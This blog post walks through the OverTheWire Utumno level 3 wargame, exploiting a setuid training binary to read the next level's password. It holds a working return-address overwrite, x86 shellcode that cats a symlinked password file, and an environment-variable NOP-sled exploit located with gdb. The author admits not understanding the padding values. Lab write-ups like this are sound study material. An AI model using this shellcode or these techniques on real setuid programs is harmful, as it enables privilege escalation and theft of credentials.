---
layout: post
title: OverTheWire - Utumno3
---

Site: http://overthewire.org/wargames/utumno/ <br>
Level: 3<br>
Situation: ASM Reading Exercise<br><br>

Let’s begin this madness. We start by creating our temp file directory checking our file archtype and the output.

{% highlight bash %}
utumno3@melinda:~$ mkdir /tmp/uh3
utumno3@melinda:~$ cd /tmp/uh3
{% endhighlight %}

{% highlight bash %}
utumno3@melinda:/tmp/uh3$ file /utumno/utumno3
/utumno/utumno3: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=f08e1d32ab3f918787ecb922b16945e4dfb18383, not stripped
{% endhighlight %}

{% highlight bash %}
utumno3@melinda:/tmp/uh3$ /utumno/utumno3
as
as
^C
{% endhighlight %}

Nothing useful just that we are taking input from the user and nothing left. We are going to go ahead and download the file and open in hopper to get us some information.

![Embeded](/images/utumno/utumno3/graphview1.png)
[FullSize](/images/utumno/utumno3/graphview1.png)

At first glance doesn’t seem like anything too confusing after some investigating we get the general program flow.

![Embeded](/images/utumno/utumno3/graphview2.png)
[FullSize](/images/utumno/utumno3/graphview2.png)

From this we can conclude that the every second character is put into the stack at the position that is computed. 
This is how we can control our EIP.

NOTE: At this point in the challenge I became confused and unable to solve it myself. Unfortunately my math and understanding of bitwise operators is not up to par and I could not conclude the complete solution on my own. After some research I came across a Japanese post talking about the following. 

Here one can read a character, where you can do in v2 modify the return address. To this end, we find the distance v2 and the return address is 0x2c, then fill in the character to v1 should be 0x2c ^ 0, 0x2d ^ 3, 0x2e ^ 6, 0x2f ^ 9. I tried invoke shell, but did not respond, plus cat does not work; so I had to read the file with the shell code

With the following string.

{% highlight perl %}
perl -e 'print "\x2c\xc8\x2e\xd8\x28\xff\x26\xff"' | /utumno/utumno3
{% endhighlight %}
[Source](http://rk700.github.io/writeup/2014/07/16/utumno/)


Obviously this code isn't runnable because it is simply a memory address. If we break it down the shell code we notice that it turns into

{% highlight bash %}
x2c = 44
xc8 = address - part 4
x2e = 46
xd8 = address - part 3
x28 = 40
xff = address - part 2
x26 = 38
xff = address - part 1
{% endhighlight %}

So we know the desired address is 0xffffd8c8, obviously this is pointing to shell code in memory within the stack. However the confusing part is the padding used. The space doesn’t make any sense at least not to me. Although we don't have the understanding we have enough information to create a solution.

We need to create an EGG in our environmental variables to store our shell code.
We are going to reuse the /tmp/b2p reading shell code due to the fact that when I also ran a /bin/sh shell it didn't respond.

{% highlight bash %}
\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x2f\x62\x32\x70\x68\x2f\x74\x6d\x70\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80
{% endhighlight %}

{% highlight bash %}
utumno3@melinda:/tmp/uh3$ ln -s /etc/utumno_pass/utumno4 /tmp/b2p
{% endhighlight %}

Turning our full script to.

{% highlight bash %}
 ./invoker.sh -e EGG=`perl -e 'print "\x90"x50 . "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x2f\x62\x32\x70\x68\x2f\x74\x6d\x70\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80"'` -d /utumno/utumno3
{% endhighlight %}
 
Now we just need to locate our nopsled. 

{% highlight bash %}
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) set dissassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:

-- SNIP --
   0x0804845a <+93>:	movzbl (%eax),%eax
   0x0804845d <+96>:	movsbl %al,%ebx
   0x08048460 <+99>:	call   0x80482d0 <getchar@plt>
   0x08048465 <+104>:	mov    %al,0x20(%esp,%ebx,1)
   0x08048469 <+108>:	addl   $0x1,0x3c(%esp)
   0x0804846e <+113>:	call   0x80482d0 <getchar@plt>
   0x08048473 <+118>:	mov    %eax,0x38(%esp)
   0x08048477 <+122>:	cmpl   $0xffffffff,0x38(%esp)
   0x0804847c <+127>:	je     0x8048485 <main+136>
   0x0804847e <+129>:	cmpl   $0x17,0x3c(%esp)
   0x08048483 <+134>:	jle    0x8048419 <main+28>
   0x08048485 <+136>:	mov    $0x0,%eax
   0x0804848a <+141>:	mov    -0x4(%ebp),%ebx
   0x0804848d <+144>:	leave  
-- SNIP --
{% endhighlight %}

We set a break point on the leave and find our nopsled.

{% highlight bash %}
(gdb) break *0x0804848d
(gdb) find $esp,$esp+600, 0x90909090

-- SNIP --
0xffffdf7a
0xffffdf7b
0xffffdf7c
0xffffdf7d
0xffffdf7e
0xffffdf7f
0xffffdf80
0xffffdf81
0xffffdf82
0xffffdf83
0xffffdf84
0xffffdf85
0xffffdf86
0xffffdf87
0xffffdf88
-- SNIP --

{% endhighlight %}

Just pick the address at random we will use 0xffffdf83. Now just modify our Perl command with the address.

{% highlight bash %}
perl -e 'print "\x2c\x83\x2e\xdf\x28\xff\x26\xff"' > input.txt
{% endhighlight %}

Now we just invoke it.

{% highlight bash %}
 ./invoker.sh -e EGG=`perl -e 'print "\x90"x50 . "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x2f\x62\x32\x70\x68\x2f\x74\x6d\x70\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80"'` /utumno/utumno3 < input.txt
[OMITTED]
{% endhighlight %}

There is our password. I do not consider this challenge completed as I did not understand the process involved to get the correct padding values.